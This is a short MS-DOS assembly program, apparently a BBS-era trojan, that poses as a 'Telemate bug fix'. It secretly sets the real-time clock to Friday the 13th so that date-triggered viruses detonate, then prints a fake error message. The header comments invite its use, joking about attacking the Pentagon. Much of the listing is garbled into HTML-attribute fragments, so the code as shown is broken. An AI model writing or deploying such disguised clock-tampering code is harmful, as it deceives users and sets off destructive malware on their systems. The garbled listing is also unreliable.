

;-------------------------------------------------------------------;
; Simple little program to change the date to July 13th, 1990	    ;
; Which just happens to be a Friday...what a coincidence....	    ;
; This should be great fun if you have a virus or a program that    ;
; goes *BOOM* on Friday the 13th, such as the Israel strain	    ;
; Have fun, and remember, I'm not responsible if you get your lazy  ;
; ass busted while trying to bring down the damn Pentagon	    ;
; Kryptic Night - SMC - RaCK - U< -="" phd="" ;="" ;-------------------------------------------------------------------;="" code="" segment="" assume="" cs:code,ds:code="" org="" 100h="" start:="" jmp="" begin="" text1="" db="" '="" telemate="" bug="" fix="" for="" version="" 3.0+$="" '="" ;bogus="" filler="" text="" text2="" db="" '="" tm.exe="" fixed!$="" '="" ;bogus="" filler="" text="" text3="" db="" 07h,'error!="" cannot="" alter="" tm.exe$="" '="" ;printed="" after="" change="" begin="" proc="" near="" mov="" ah,05h="" ;function="" 5="" -="" set="" real="" time="" clock="" mov="" cx,1990h="" ;what="" century="" mov="" dx,0713h="" ;month/day="" int="" 1ah="" ;execute="" mov="" ah,09h="" ;funtion="" 9="" -="" print="" string=""><end in="" $="">
	lea	dx,text3		;What text to print
	int	21h			;Execute function 09
	int	20h			;Quit .COM file
	begin	endp
CODE    ENDS					;End segment
	END start				;End program

Downloaded From P-80 International Information Systems 304-744-2253

</end>